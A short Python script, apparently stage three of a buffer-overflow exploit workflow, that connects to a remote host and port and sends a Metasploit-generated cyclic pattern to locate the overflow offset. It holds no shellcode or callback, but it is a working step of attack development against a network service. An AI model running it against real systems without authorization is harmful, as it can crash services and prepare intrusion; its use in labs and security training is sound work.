#!/usr/bin/env python3
# stage 3 generate pattern offset
import socket,sys

RHOST = sys.argv[1]                                     # the remote host
RPORT = int(sys.argv[2])                                # the remote port
PATTERN_FILE = sys.argv[3]                              # the pattern generated by msf-pattern_create.rb

# handle connection
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# setup payload  
with open(PATTERN_FILE, "r") as f:
    pattern = f.read()

postfix = "\n"

# set the encoding for Python3
buff = bytes(pattern + postfix, encoding="ascii")

# payload status
print("[+] - Sendng Payload - [ {} Bytes ]".format(len(buff) - len(postfix)))

s.send(buff)
s.close()
